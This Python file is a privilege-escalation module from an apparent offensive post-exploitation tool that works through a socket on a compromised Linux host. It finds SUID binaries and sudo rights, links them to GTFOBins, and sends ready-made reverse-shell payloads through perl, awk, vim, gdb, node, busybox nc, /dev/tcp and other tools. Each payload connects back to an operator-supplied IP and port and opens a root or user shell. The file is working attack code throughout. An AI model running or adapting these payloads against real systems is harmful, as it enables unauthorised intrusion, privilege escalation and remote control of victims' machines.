#!/usr/bin/python3
# @Мартин.
# ███████╗              ██╗  ██╗    ██╗  ██╗     ██████╗    ██╗  ██╗     ██╗    ██████╗
# ██╔════╝              ██║  ██║    ██║  ██║    ██╔════╝    ██║ ██╔╝    ███║    ╚════██╗
# ███████╗    █████╗    ███████║    ███████║    ██║         █████╔╝     ╚██║     █████╔╝
# ╚════██║    ╚════╝    ██╔══██║    ╚════██║    ██║         ██╔═██╗      ██║     ╚═══██╗
# ███████║              ██║  ██║         ██║    ╚██████╗    ██║  ██╗     ██║    ██████╔╝
# ╚══════╝              ╚═╝  ╚═╝         ╚═╝     ╚═════╝    ╚═╝  ╚═╝     ╚═╝    ╚═════╝
from plugin.core import core
import re
import time

class base:
    def __init__(self, ip, port):
        self.suid = {
            'pkexec':False,
            'screen':False,
            'systemctl':False,
            'chkrootkit':False
        }
        self.ip = ip
        self.port = port
        self.payloads = {
            'jjs':  (
        f'echo "Java.type(\'java.lang.Runtime\').getRuntime().exec(\'cp /bin/bash /tmp/bash\').waitFor();'
        f'Java.type(\'java.lang.Runtime\').getRuntime().exec(\'chmod u+s /tmp/bash\').waitFor();" | jjs'
    ),
            'nawk': self.create_payload('nawk', "-v RHOST=$RHOST -v RPORT=$RPORT 'BEGIN {{ s = \"/inet/tcp/0/\" RHOST \"/\" RPORT; while (1) {{printf \"> \" |& s; if ((s |& getline c) <= 0) break; while (c && (c |& getline) > 0) print $0 |& s; close(c)}}}}'"),
            'julia': self.create_payload('julia', "-e 'using Sockets; sock=connect(ENV[\"RHOST\"], parse(Int64,ENV[\"RPORT\"])); while true; cmd = readline(sock); if !isempty(cmd); cmd = split(cmd); ioo = IOBuffer(); ioe = IOBuffer(); run(pipeline($cmd, stdout=ioo, stderr=ioe)); write(sock, String(take!(ioo)) * String(take!(ioe))); end; end;'"),
            'busybox': self.create_payload('busybox', "nc -e /bin/sh $RHOST $RPORT"),
            'ksh': self.create_payload('ksh', "-c 'ksh -i > /dev/tcp/$RHOST/$RPORT 2>&1 0>&1'"),
            'jrunscript': self.create_payload('jrunscript', "-e 'var host=\"{IP}\"; var port=\"{PORT}\"; var p=new java.lang.ProcessBuilder(\"/bin/bash\", \"-i\").redirectErrorStream(true).start(); var s=new java.net.Socket(host,port); var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream(); var po=p.getOutputStream(),so=p.getOutputStream();while(!s.isClosed()){{ while(pi.available()>0)so.write(pi.read()); while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read()); so.flush();po.flush(); java.lang.Thread.sleep(50); try {{p.exitValue();break;}}catch (e){{}}}};p.destroy();s.close();'"),
            'node': self.create_payload('node', "-e 'sh = require(\"child_process\").spawn(\"/bin/sh\"); require(\"net\").connect(process.env.RPORT, process.env.RHOST, function () {{ this.pipe(sh.stdin); sh.stdout.pipe(this); sh.stderr.pipe(this); }})'"),
            'rc': "sudo install -m =xs $(which rc) .\n\n./rc -c '/bin/sh -p'",
            'vimdiff': self.create_payload('vimdiff', "-c ':py import vim,sys,socket,os,pty;s=socket.socket(); s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\")))); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn(\"/bin/sh\"); vim.command(\":q!\")'"),
            'strace': f"LFILE=file_to_write\nstrace -s 999 -o $LFILE strace - DATA",
            'vim': self.create_payload('vim', "-c ':py import vim,sys,socket,os,pty;s=socket.socket(); s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\")))); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn(\"/bin/sh\"); vim.command(\":q!\")'"),
            'nmap': self.create_payload('nmap', "TF=$(mktemp)\necho 'local s=require(\"socket\"); local t=assert(s.tcp()); t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\")); while true do local r,x=t:receive();local f=assert(io.popen(r,\"r\")); local b=assert(f:read(\"*a\"));t:send(b); end; f:close();t:close();' > $TF\nnmap --script=$TF"),
            'rview': self.create_payload('rview', "-c ':py import vim,sys,socket,os,pty;s=socket.socket(); s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\")))); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn(\"/bin/sh\"); vim.command(\":q!\")'"),
            'awk': self.create_payload('awk', "-v RHOST=$RHOST -v RPORT=$RPORT 'BEGIN {{ s = \"/inet/tcp/0/\" RHOST \"/\" RPORT; while (1) {{printf \"> \" |& s; if ((s |& getline c) <= 0) break; while (c && (c |& getline) > 0) print $0 |& s; close(c)}}}}'"),
            'gimp': self.create_payload('gimp', "-idf --batch-interpreter=python-fu-eval -b 'import sys,socket,os,pty;s=socket.socket(); s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\")))); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn(\"/bin/sh\")'"),
            'perl': self.create_payload('perl', "-e 'use Socket;$i=\"$ENV{{RHOST}}\";$p=$ENV{{RPORT}};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"),
            'tclsh': self.create_payload('tclsh', "echo 'set s [socket $::env(RHOST) $::env(RPORT)];while 1 {{ puts -nonewline $s \"> \";flush $s;gets $s c;set e \"exec $c\";if {{![catch {{set r [eval $e]} err]}} {{ puts $s $r }}; flush $s; }}; close $s;' | tclsh"),
            'gawk': self.create_payload('gawk',
                                        f"export RHOST={self.ip}; export RPORT={self.port}; "
                                        f"awk -v RHOST=$RHOST -v RPORT=$RPORT "
                                        f"'BEGIN {{ s = \"/inet/tcp/0/\" RHOST \"/\" RPORT; "
                                        f"while (1) {{ printf \"> \" |& s; if ((s |& getline c) <= 0) break; "
                                        f"while (c && (c |& getline) > 0) print $0 |& s; close(c) }} }}'"),
            'gdb': self.create_payload('gdb', "-nx -ex 'python import sys,socket,os,pty;s=socket.socket(); s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\")))); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn(\"/bin/sh\")' -ex quit"),
            'rvim': self.create_payload('rvim', "-c ':py import vim,sys,socket,os,pty;s=socket.socket(); s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\")))); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn(\"/bin/sh\"); vim.command(\":q!\")'"),
        }
        self.available_payload = list()

    def __find_SUID(self, sock):
        core.send_command(sock, 'find / -type f -perm -4000 2>/dev/null')
        response = core.recv_response(sock, 15)
        self.__find_chkrootkit(sock)
        self.print_suid_files(response)
        self.__exploit(sock)

    def create_payload(self, tool, command_template):
        return f"export RHOST={self.ip}; export RPORT={self.port}; {command_template}"

    def print_suid_files(self, response):

        suid_programs = set([
            'aa-exec', 'ab', 'agetty', 'alpine', 'ar', 'arj', 'arp', 'as', 'ascii-xfr', 'ash',
            'aspell', 'atobm', 'awk', 'base32', 'base64', 'basenc', 'basez', 'bash', 'bc', 'bridge',
            'busctl', 'busybox', 'bzip2', 'cabal', 'capsh', 'cat', 'chmod', 'choom', 'chown', 'chroot',
            'clamscan', 'cmp', 'column', 'comm', 'cp', 'cpio', 'cpulimit', 'csh', 'csplit', 'csvtool',
            'cupsfilter', 'curl', 'cut', 'dash', 'date', 'dd', 'debugfs', 'dialog', 'diff', 'dig',
            'distcc', 'dmsetup', 'docker', 'dosbox', 'ed', 'efax', 'elvish', 'emacs', 'env', 'eqn',
            'espeak', 'expand', 'expect', 'file', 'find', 'fish', 'flock', 'fmt', 'fold', 'gawk',
            'gcore', 'gdb', 'genie', 'genisoimage', 'gimp', 'grep', 'gtester', 'gzip', 'hd', 'head',
            'hexdump', 'highlight', 'hping3', 'iconv', 'install', 'ionice', 'ip', 'ispell', 'jjs',
            'join', 'jq', 'jrunscript', 'julia', 'ksh', 'ks', 'kubectl', 'ld.so', 'less', 'links',
            'logsave', 'look', 'lua', 'make', 'mawk', 'minicom', 'more', 'mosquitto', 'msgattrib',
            'msgcat', 'msgconv', 'msgfilter', 'msgmerge', 'msguniq', 'multitime', 'mv', 'nasm', 'nawk',
            'ncftp', 'nft', 'nice', 'nl', 'nm', 'nmap', 'node', 'nohup', 'ntpdate', 'od', 'openssl',
            'openvpn', 'pandoc', 'paste', 'perf', 'perl', 'pexec', 'pg', 'php', 'pidstat', 'pr', 'ptx',
            'python', 'rc', 'readelf', 'restic', 'rev', 'rlwrap', 'rsync', 'rtorrent', 'run-parts',
            'rview', 'rvim', 'sash', 'scanmem', 'sed', 'setarch', 'setfacl', 'setlock', 'shuf',
            'soelim', 'softlimit', 'sort', 'sqlite3', 'ss', 'ssh-agent', 'ssh-keygen', 'ssh-keyscan',
            'sshpass', 'start-stop-daemon', 'stdbuf', 'strace', 'strings', 'sysctl', 'systemctl', 'tac',
            'tail', 'taskset', 'tbl', 'tclsh', 'tee', 'terraform', 'tftp', 'tic', 'time', 'timeout',
            'troff', 'ul', 'unexpand', 'uniq', 'unshare', 'unsquashfs', 'unzip', 'update-alternatives',
            'uudecode', 'uuencode', 'vagrant', 'varnishncsa', 'view', 'vigr', 'vim', 'vimdiff', 'vipw',
            'w3m', 'watch', 'wc', 'wget', 'whiptail', 'xargs', 'xdotool', 'xmodmap', 'xmore', 'xxd',
            'xz', 'yash', 'zsh', 'zsoelim'
        ])
        base_url = "https://gtfobins.github.io/gtfobins/"
        suid_pattern = re.compile(r'^/.+', re.MULTILINE)
        suid_files = suid_pattern.findall(response)


        exploitable_files = []
        for suid_file in suid_files:
            file_name = suid_file.split('/')[-1]
            if 'pkexec' in file_name:
                    print("[+] pkexec may have a privilege escalation vulnerability!")
                    self.suid['pkexec'] = True
            if 'screen-4.5.0' in file_name:
                    print("[+] screen-4.5.0 may have a privilege escalation vulnerability!")
                    self.suid['screen'] = True
            if 'systemctl' in file_name:
                    print("[+] systemctl may have a privilege escalation vulnerability!")
                    self.suid['systemctl'] = True
            
            if file_name in suid_programs:
                exploitable_files.append(suid_file)
                if file_name in self.payloads:
                    self.available_payload.append(file_name)


        for suid_file in exploitable_files:
            print("[+] Exploit => " + base_url + suid_file.split('/')[-1])

    def __find_chkrootkit(self,socks):
        core.send_command(socks,"which chkrootkit")
        res = core.recv_response(socks,4)
        if '/chkrootkit' in res:
            print("[+] chkrootkit may have a privilege escalation vulnerability!")
            self.suid['chkrootkit'] = True

    def __exploit(self, sock):
        if len(self.available_payload)>0:
            print("[+] Attempt to exploit SUID files...")
            for name in self.available_payload:
                if input(f"[!] Do you want to exploit the vulnerability in file {name}? (y/n) >").strip().lower() != 'y':
                    continue
                print("[+] Exploiting:", name)
                core.send_command(sock, self.payloads[name])
                if 'jjs' in name:
                    print("[+] Payload => /tmp/bash -p")
                print("[+] Exploitation completed....")
        else:
            print("[-] No SUID files available for exploitation")


    def __SUDO_file(self, socks, password=None):
        core.send_command(socks,  f"echo '{password}'|sudo -S -l")

        response = core.recv_response(socks, 5)

        unrestricted_pattern = re.compile(r'\(ALL : ALL\) ALL')
        if unrestricted_pattern.search(response):
            payload = f"echo '{password}' | sudo -S /bin/bash -c '/bin/bash -i >& /dev/tcp/{self.ip}/{self.port} 0>&1'"
            print(f"[+] Unrestricted sudo access detected. Payload => {payload}")
            core.send_command(socks, payload)
            print("[*] Payload sent...")
            return

        sudo_pattern = re.compile(r'\(root\) NOPASSWD: ([^\n]+)')
        matches = sudo_pattern.findall(response)

        if matches:
            for match in matches:
                parts = match.strip().split()
                if len(parts) >= 2:
                    command = parts[0]
                    path = ' '.join(parts[1:])

                    if 'vi' in command:
                        if input(f"[!] Do you want to exploit the vulnerability in command 'vi' ? (y/n) >").strip().lower() != 'y':
                            continue
                        payload = f"sudo {command} {path} -c ':!/bin/bash -c \"/bin/bash -i >& /dev/tcp/{self.ip}/{self.port} 0>&1\"' /dev/null"
                        print(f"[+] SUDO file privilege escalation payload => {payload}")
                        core.send_command(socks, payload)
                        print("[*] Payload sent...")
                    else:
                        print(f"[+] Detected command: {command}, Path: {path}")
                else:
                    print(f"[-] Unexpected format in sudo output: {match}")
        else:
            print("[-] No SUDO command privilege escalation vulnerabilities.")

    def check(self, sock,password=None):
        print("[*] Retrieving SUID files")
        self.__find_SUID(sock)
        print("[*] Retrieving SUDO files")
        self.__SUDO_file(sock,password)
        print("[-] Basic module detection completed")
        return self.suid


